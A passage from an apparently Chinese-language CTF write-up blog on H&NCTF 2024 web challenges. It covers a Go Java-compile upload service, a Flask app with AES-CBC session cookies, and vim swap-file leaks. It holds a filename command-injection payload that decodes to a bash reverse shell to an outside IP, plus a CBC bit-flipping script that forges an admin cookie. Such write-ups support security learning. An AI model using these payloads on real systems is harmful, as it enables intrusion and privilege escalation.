class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blacklistChars = []<span class="type">rune</span>&#123;<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 设置路由</span></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/gojava&quot;</span>, compileJava)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置静态文件服务器</span></span><br><span class="line">fs := http.FileServer(http.Dir(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, fs)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">log.Println(<span class="string">&quot;Server started on :80&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isFilenameBlacklisted</span><span class="params">(filename <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, char := <span class="keyword">range</span> filename &#123;</span><br><span class="line"><span class="keyword">for</span> _, blackChar := <span class="keyword">range</span> blacklistChars &#123;</span><br><span class="line"><span class="keyword">if</span> char == blackChar &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compileJava</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 检查请求方法是否为POST</span></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析multipart/form-data格式的表单数据</span></span><br><span class="line">err := r.ParseMultipartForm(<span class="number">10</span> &lt;&lt; <span class="number">20</span>) <span class="comment">// 设置最大文件大小为10MB</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从表单中获取上传的文件</span></span><br><span class="line">file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="string">&quot;.java&quot;</span>) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, <span class="string">&quot;./upload/&quot;</span>+handler.Filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(file multipart.File, filePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// 创建目标文件</span></span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上传的文件内容复制到目标文件中</span></span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不用细看, 基本上就能猜到使用相同命令javac + 文件名 这种形式来编译上传的文件, 那么既然是系统命令, 就可以通过上传的 文件名进行命令注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514130817384.png" alt="image-20240514130817384"></p><p>可以看见确实如此, 但是这里是一个gojava的低权限用户, 想办法弹shell提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi83Nzc3IDA+JjE=| base64 -d |bash;Main.java&quot;</span><br></pre></td></tr></table></figure><p>根目录下有一个很特殊的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514131921586.png" alt="image-20240514131921586"></p><p>这里面的内容就算是root的密码</p><p>直接su root, 然后运行&#x2F;start.sh即可, flag在root目录下</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>考察CBC反转攻击</p><p><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>贴一个其他师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1. 分组 16个字节一组</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;user1&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    2. 获取原始密文</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;wv7sRdpuU1HMAgqUWAOjoZuLsH9jUDnCaVtBxN8fQH6zyxmGqarbH7R/cuSUVx1xnKKDoUjIeo1GQwkg39DZ6Q==&#x27;</span></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    3， 字节翻转</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">array_cipher[offset] =  array_cipher[offset]^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后就是文件读取+flask pin计算, 偷个懒</p><h2 id="奇怪的网站"><a href="#奇怪的网站" class="headerlink" title="奇怪的网站"></a>奇怪的网站</h2><p>目录扫描可以扫描出来&#x2F;404.php &#x2F;flag.php</p><p>访问网站时有一个302重定向, 这里有提示</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530001443451.png" alt="image-20240530001443451"></p><p>如果有使用vim的经验的化我们知道vim在异常退出的时候会生成一个隐藏的缓存文件的</p><blockquote><p>第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn, 第四次产生的缓存文件后缀为.swm</p></blockquote><h2 id="GPTS"><a href="#GPTS" class="headerlink" title="GPTS"></a>GPTS</h2><p><a href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2+kdurD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></p><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;H-NCTF-2024-WEB-复现&quot;&gt;&lt;a href=&quot;#H-NCTF-2024-WEB-复现&quot; class=&quot;headerlink&quot; title=&quot;H&amp;amp;NCTF 2024 WEB 复现&quot;&gt;&lt;/a&gt;H&amp;amp;NCTF 2024 WEB 复现&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
    <category term="python内存马" scheme="http://example.com/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="CBC翻转攻击" scheme="http://example.com/tags/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
    <category term="侧信道" scheme="http://example.com/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
    <category term="Flask Pin码计算" scheme="http://example.com/tags/Flask-Pin%E7%A0%81%E8%AE%A1%E7%AE%97/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
</feed>
